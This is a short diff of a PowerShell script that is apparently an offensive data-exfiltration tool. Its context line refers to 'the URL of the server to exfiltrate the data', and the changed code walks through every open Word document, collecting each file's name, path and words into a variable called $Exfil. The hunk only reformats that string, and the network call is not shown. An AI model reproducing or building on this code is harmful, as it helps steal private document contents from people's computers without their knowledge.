@@ -78,7 +78,7 @@ Indicates the URL of the server to exfiltrate the data.
     finally {
         foreach ($WordDoc in $WordDocuments.Documents) {
             
-            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: "
+            $Exfil = "##-BEGIN-##" + "`n" + $WordDoc.Name + "`n" + $WordDoc.FullName + "`n" + "Words:"
                     
             foreach ($Word in $WordDoc.Words) {
                 if ($null -ne $Word.Text){
